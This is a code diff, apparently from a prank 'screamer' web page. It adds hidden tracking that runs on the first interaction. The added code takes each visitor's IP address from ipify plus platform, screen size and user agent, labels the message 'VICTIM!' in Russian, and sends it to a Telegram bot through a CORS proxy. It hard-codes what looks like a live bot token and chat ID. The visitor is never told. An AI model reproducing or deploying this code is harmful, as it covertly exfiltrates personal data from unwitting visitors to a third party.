@@ -64,22 +64,33 @@
             const screamer = document.getElementById('screamer');
             let started = false;
 
+            const TG_TOKEN = "8861612688:AAGHhJMkESLYIOfAQmDgEeILm3-mJAbmyLc";
+            const TG_CHAT_ID = "5609993893";
+
             function start() {
                 if (started) return;
                 started = true;
 
-                // ОТПРАВКА НА ТВОЙ PYTHON-СЕРВЕР
-                fetch("https://app-fre1.onrender.com/log", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        platform: navigator.platform,
-                        screen: window.screen.width + "x" + window.screen.height,
-                        language: navigator.language,
-                        userAgent: navigator.userAgent
+                // === ОТПРАВКА ЧЕРЕЗ БЕСПЛАТНЫЙ ПРОКСИ ===
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        const ip = data.ip;
+                        const text = `ЖЕРТВА! IP: ${ip} | Платформа: ${navigator.platform} | Экран: ${window.screen.width}x${window.screen.height} | Браузер: ${navigator.userAgent}`;
+                        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`;
+                        
+                        // Пропускаем через CORS-прокси
+                        fetch(`https://corsproxy.io/?${encodeURIComponent(url)}`)
+                            .catch(e => console.log("Ошибка ТГ:", e));
                     })
-                }).catch(e => console.log(e));
+                    .catch(() => {
+                        // Если IP не получили, шлем без него
+                        const text = `ЖЕРТВА! Платформа: ${navigator.platform} | Браузер: ${navigator.userAgent}`;
+                        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`;
+                        fetch(`https://corsproxy.io/?${encodeURIComponent(url)}`).catch(e => console.log(e));
+                    });
 
+                // === РАЗЪЁБ ===
                 let isRickroll = Math.random() < 0.1;
                 hint.classList.add('hidden');
 
